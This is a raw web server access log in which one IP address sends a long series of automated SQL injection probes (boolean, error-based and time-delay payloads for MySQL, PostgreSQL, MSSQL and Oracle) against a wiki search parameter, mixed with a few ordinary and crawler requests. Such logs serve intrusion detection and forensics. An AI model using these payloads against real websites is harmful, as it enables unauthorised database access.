81.19.136.15 - - [18/Oct/2022:09:01:08 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%20AND%203779%3D5346--%20oMto&q=1 HTTP/1.1" 200 64031 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:01:12 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%20AND%205957%3D5957--%20BOdB&q=1 HTTP/1.1" 200 64031 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:01:15 +0200] "GET /Main/SearchWiki?pagename=%28SELECT%20%28CASE%20WHEN%20%281735%3D3691%29%20THEN%201735%20ELSE%201735%2A%28SELECT%201735%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%29%20END%29%29&q=1 HTTP/1.1" 200 64104 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:01:18 +0200] "GET /Main/SearchWiki?pagename=%28SELECT%20%28CASE%20WHEN%20%289527%3D9527%29%20THEN%209527%20ELSE%209527%2A%28SELECT%209527%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%29%20END%29%29&q=1 HTTP/1.1" 200 64104 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:01:21 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%29%20AND%20%28SELECT%202562%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7171767071%2C%28SELECT%20%28ELT%282562%3D2562%2C1%29%29%29%2C0x717a6a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%285884%3D5884&q=1 HTTP/1.1" 200 64197 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:01:24 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%20AND%20%28SELECT%202562%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7171767071%2C%28SELECT%20%28ELT%282562%3D2562%2C1%29%29%29%2C0x717a6a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29&q=1 HTTP/1.1" 200 64181 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:01:27 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27%29%20AND%20%28SELECT%202562%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7171767071%2C%28SELECT%20%28ELT%282562%3D2562%2C1%29%29%29%2C0x717a6a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%28%27rpZS%27%3D%27rpZS&q=1 HTTP/1.1" 200 64221 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:01:30 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27%20AND%20%28SELECT%202562%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7171767071%2C%28SELECT%20%28ELT%282562%3D2562%2C1%29%29%29%2C0x717a6a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27gOYu%27%3D%27gOYu&q=1 HTTP/1.1" 200 64219 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:01:32 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%25%27%20AND%20%28SELECT%202562%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7171767071%2C%28SELECT%20%28ELT%282562%3D2562%2C1%29%29%29%2C0x717a6a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27%25%27%3D%27&q=1 HTTP/1.1" 200 64213 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:01:34 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%20AND%20%28SELECT%202562%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7171767071%2C%28SELECT%20%28ELT%282562%3D2562%2C1%29%29%29%2C0x717a6a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29--%20kdBQ&q=1 HTTP/1.1" 200 64188 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:01:36 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%29%20AND%207119%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287119%3D7119%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%285075%3D5075&q=1 HTTP/1.1" 200 64213 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:01:39 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%20AND%207119%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287119%3D7119%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29&q=1 HTTP/1.1" 200 64197 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
194.39.218.10 - - [18/Oct/2022:09:01:44 +0200] "GET /uploads/Arks/Arks_The_Game.pdf HTTP/1.1" 200 774337 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
81.19.136.15 - - [18/Oct/2022:09:01:43 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27%29%20AND%207119%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287119%3D7119%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27cyOZ%27%3D%27cyOZ&q=1 HTTP/1.1" 200 64237 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
194.39.218.10 - - [18/Oct/2022:09:01:44 +0200] "GET /favicon.ico HTTP/1.1" 200 1406 "https://www.ywesee.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
81.19.136.15 - - [18/Oct/2022:09:01:45 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27%20AND%207119%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287119%3D7119%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27EVzY%27%3D%27EVzY&q=1 HTTP/1.1" 200 64235 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:01:48 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%25%27%20AND%207119%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287119%3D7119%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27%25%27%3D%27&q=1 HTTP/1.1" 200 64229 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:01:51 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%20AND%207119%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287119%3D7119%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20gxyN&q=1 HTTP/1.1" 200 64204 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:01:54 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%29%20AND%205981%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%285981%3D5981%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29%20AND%20%287087%3D7087&q=1 HTTP/1.1" 200 64222 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:01:56 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%20AND%205981%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%285981%3D5981%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29&q=1 HTTP/1.1" 200 64206 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:01:59 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27%29%20AND%205981%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%285981%3D5981%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29%20AND%20%28%27lhqZ%27%3D%27lhqZ&q=1 HTTP/1.1" 200 64246 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:02:01 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27%20AND%205981%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%285981%3D5981%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29%20AND%20%27oxoD%27%3D%27oxoD&q=1 HTTP/1.1" 200 64244 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:02:03 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%25%27%20AND%205981%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%285981%3D5981%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29%20AND%20%27%25%27%3D%27&q=1 HTTP/1.1" 200 64238 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:02:06 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%20AND%205981%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%285981%3D5981%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29--%20hLAq&q=1 HTTP/1.1" 200 64213 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:02:09 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%29%20AND%202779%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%282779%3D2779%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%281794%3D1794&q=1 HTTP/1.1" 200 64258 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
185.191.171.11 - - [18/Oct/2022:09:02:11 +0200] "GET /ODDB/OddbDat?n=Main.SideBar%3Faction%3Dedit HTTP/1.1" 302 157 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
81.19.136.15 - - [18/Oct/2022:09:02:11 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%20AND%202779%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%282779%3D2779%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29&q=1 HTTP/1.1" 200 64242 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:02:14 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27%29%20AND%202779%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%282779%3D2779%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27FQmI%27%3D%27FQmI&q=1 HTTP/1.1" 200 64282 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:02:16 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27%20AND%202779%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%282779%3D2779%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27Vrrz%27%3D%27Vrrz&q=1 HTTP/1.1" 200 64280 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:02:18 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%25%27%20AND%202779%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%282779%3D2779%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27%25%27%3D%27&q=1 HTTP/1.1" 200 64274 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:02:21 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%20AND%202779%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%282779%3D2779%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20qnVw&q=1 HTTP/1.1" 200 64249 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:02:33 +0200] "GET /Main/SearchWiki?pagename=%28SELECT%204912%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7171767071%2C%28SELECT%20%28ELT%284912%3D4912%2C1%29%29%29%2C0x717a6a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29&q=1 HTTP/1.1" 200 64161 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:02:37 +0200] "GET /Main/SearchWiki?pagename=%28SELECT%20CONCAT%280x7171767071%2C%28SELECT%20%28ELT%285677%3D5677%2C1%29%29%29%2C0x717a6a6b71%29%29&q=1 HTTP/1.1" 200 64065 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:02:39 +0200] "GET /Main/SearchWiki?pagename=%28SELECT%20%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285430%3D5430%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%29&q=1 HTTP/1.1" 200 64164 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:02:42 +0200] "GET /Main/SearchWiki?pagename=%28SELECT%20CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%286171%3D6171%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29&q=1 HTTP/1.1" 200 64168 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:02:45 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%29%3BSELECT%20SLEEP%285%29%23&q=1 HTTP/1.1" 200 64028 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:02:47 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%3BSELECT%20SLEEP%285%29%23&q=1 HTTP/1.1" 200 64027 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:02:49 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27%29%3BSELECT%20SLEEP%285%29%23&q=1 HTTP/1.1" 200 64034 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:02:51 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27%3BSELECT%20SLEEP%285%29%23&q=1 HTTP/1.1" 200 64033 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:02:53 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%25%27%3BSELECT%20SLEEP%285%29%23&q=1 HTTP/1.1" 200 64034 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:02:55 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%29%3BSELECT%20PG_SLEEP%285%29--&q=1 HTTP/1.1" 200 64032 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
194.209.200.2 - - [18/Oct/2022:09:02:56 +0200] "GET /Main/2015 HTTP/1.1" 200 15908 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
81.19.136.15 - - [18/Oct/2022:09:02:58 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%3BSELECT%20PG_SLEEP%285%29--&q=1 HTTP/1.1" 200 64031 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:03:00 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27%29%3BSELECT%20PG_SLEEP%285%29--&q=1 HTTP/1.1" 200 64038 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:03:02 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27%3BSELECT%20PG_SLEEP%285%29--&q=1 HTTP/1.1" 200 64037 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
194.209.200.2 - - [18/Oct/2022:09:03:04 +0200] "GET /Main/2013 HTTP/1.1" 200 20487 "-" "Mozilla/5.0 (compatible; TMMBot/0.2; +http://www.dslab.ch)/Nutch-1.15"
81.19.136.15 - - [18/Oct/2022:09:03:04 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%25%27%3BSELECT%20PG_SLEEP%285%29--&q=1 HTTP/1.1" 200 64038 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:03:07 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&q=1 HTTP/1.1" 200 64045 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:03:09 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&q=1 HTTP/1.1" 200 64044 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
81.19.136.15 - - [18/Oct/2022:09:03:11 +0200] "GET /Main/SearchWiki?pagename=Main%2FSearchWiki%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&q=1 HTTP/1.1" 200 64051 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 4.0.20506)"
